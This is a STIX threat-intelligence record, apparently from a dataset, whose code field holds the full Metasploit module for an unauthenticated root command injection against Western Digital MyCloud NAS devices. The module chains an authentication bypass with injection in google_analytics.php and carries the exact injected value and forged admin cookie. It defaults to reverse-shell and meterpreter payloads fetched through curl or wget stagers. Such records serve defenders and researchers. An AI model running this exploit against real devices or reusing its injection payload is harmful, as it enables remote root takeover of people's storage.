{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4d74757-07af-4866-92a9-75fc3ffe39b9",
    "created": "2024-08-14T17:01:17.157032Z",
    "modified": "2024-08-14T17:01:17.157036Z",
    "name": "Western Digital MyCloud unauthenticated command injection",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/wd_mycloud_unauthenticated_cmd_injection.rb",
            "external_id": "wd_mycloud_unauthenticated_cmd_injection.rb"
        },
        {
            "source_name": "StevenCampbell",
            "external_id": "#CVE-2016-10108disclosureandPoC"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20170315123948/https://www.stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/#CVE-2016-10108disclosureandPoC"
        },
        {
            "source_name": "DisclosureDate=>2016-12-14",
            "external_id": "#CVE-2016-10108disclosuredate"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Western Digital MyCloud unauthenticated command injection',\n        'Description' => %q{\n          This module exploits authentication bypass (CVE-2018-17153) and\n          command injection (CVE-2016-10108) vulnerabilities in Western\n          Digital MyCloud before 2.30.196 in order to achieve\n          unauthenticated remote code execution as the root user.\n\n          The module first performs a check to see if the target is\n          WD MyCloud. If so, it attempts to trigger an authentication\n          bypass (CVE-2018-17153) via a crafted GET request to\n          /cgi-bin/network_mgr.cgi. If the server responds as expected,\n          the module assesses the vulnerability status by attempting to\n          exploit a commend injection vulnerability (CVE-2016-10108) in\n          order to print a random string via the echo command. This is\n          done via a crafted POST request to /web/google_analytics.php.\n\n          If the server is vulnerable, the same command injection vector\n          is leveraged to execute the payload.\n\n          This module has been successfully tested against Western Digital\n          MyCloud version 2.30.183.\n\n          Note: based on the available disclosures, it seems that the\n          command injection vector (CVE-2016-10108) might be exploitable\n          without the authentication bypass (CVE-2018-17153) on versions\n          before 2.21.126. The obtained results on 2.30.183 imply that\n          the patch for CVE-2016-10108 did not actually remove the command\n          injection vector, but only prevented unauthenticated access to it.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Erik Wynter', # @wyntererik - Metasploit\n          'Steven Campbell', # CVE-2016-10108 disclosure and PoC\n          'Remco Vermeulen' # CVE-2018-17153 disclosure and PoC\n        ],\n        'References' => [\n          ['CVE', '2016-10108'], # command injection in /web/google_analytics.php via a modified arg parameter in the POST data.\n          ['CVE', '2018-17153'], # authentication bypass\n          ['URL', 'https://www.securify.nl/advisory/authentication-bypass-vulnerability-in-western-digital-my-cloud-allows-escalation-to-admin-privileges/'], # CVE-2018-17153 disclosure and PoC\n          ['URL', 'https://web.archive.org/web/20170315123948/https://www.stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/'] # CVE-2016-10108 disclosure and PoC\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Platform' => %w[linux unix],\n        'Arch' => [ ARCH_ARMLE, ARCH_CMD ],\n        'Targets' => [\n          [\n            'Unix In-Memory',\n            {\n              'Platform' => [ 'unix', 'linux' ],\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' },\n              'Type' => :unix_memory\n            }\n          ],\n          [\n            'Linux Dropper', {\n              'Arch' => [ARCH_ARMLE],\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp',\n                'CMDSTAGER::FLAVOR' => :curl\n              },\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'CmdStagerFlavor' => ['curl', 'wget'],\n        'Privileged' => true,\n        'DisclosureDate' => '2016-12-14', # CVE-2016-10108 disclosure date\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The base path to WD MyCloud', '/']),\n    ])\n  end\n\n  def check\n    # sanity check to see if the target is likely WD MyCloud\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n\n    return CheckCode::Unknown('Connection failed.') unless res\n\n    return CheckCode::Safe('Target is not a WD MyCloud application.') unless res.code == 200 && res.body.include?('var MODEL_ID = \"WDMyCloud')\n\n    print_status(\"#{rhost}:#{rport} - The target is WD MyCloud. Checking vulnerability status...\")\n    # try the authentication bypass (CVE-2018-17153)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'network_mgr.cgi'),\n      'vars_get' => {\n        'cmd' => 'cgi_get_ipv6',\n        'flag' => 1 # this cannot be randomized according to the CVE-2018-17153 details\n      }\n    })\n\n    return CheckCode::Unknown('Connection failed while attempting to trigger the authentication bypass.') unless res\n\n    return CheckCode::Unknown(\"Received unexpected response code #{res.code} while attempting to trigger the authentication bypass.\") unless res.code == 404\n\n    # send a command to print a random string via echo. if the target is vulnerable, both the command  and the command output will be part of the response body\n    echo_cmd = \"echo #{Rex::Text.rand_text_alphanumeric(8..42)}\"\n    print_status(\"#{rhost}:#{rport} - Attempting to execute #{echo_cmd}...\")\n    res = execute_command(echo_cmd, { 'wait_for_response' => true })\n\n    return CheckCode::Unknown('Connection failed while trying to execute the echo command to check the vulnerability status.') unless res\n\n    return CheckCode::Vulnerable('The target executed the echo command.') if res.code == 200 && res.body.include?(echo_cmd) && res.body.include?('\"success\":true')\n\n    CheckCode::Safe('The target failed to execute the echo command.')\n  end\n\n  def execute_command(cmd, opts = {})\n    request_hash = {\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'web', 'google_analytics.php'),\n      'cookie' => 'username=admin',\n      'vars_post' => {\n        'cmd' => 'set',\n        'opt' => 'cloud-device-num',\n        'arg' => \"0|echo `#{cmd}` #\"\n      }\n    }\n\n    return send_request_cgi(request_hash) if opts['wait_for_response']\n\n    # if we are trying to execute the payload, we can just yeet it at the server and return without waiting for a response\n    send_request_cgi(request_hash, 0)\n  end\n\n  def exploit\n    if target.arch.first == ARCH_CMD\n      print_status(\"#{rhost}:#{rport} - Executing the payload. This may take a few seconds...\")\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "linux'"
    ]
}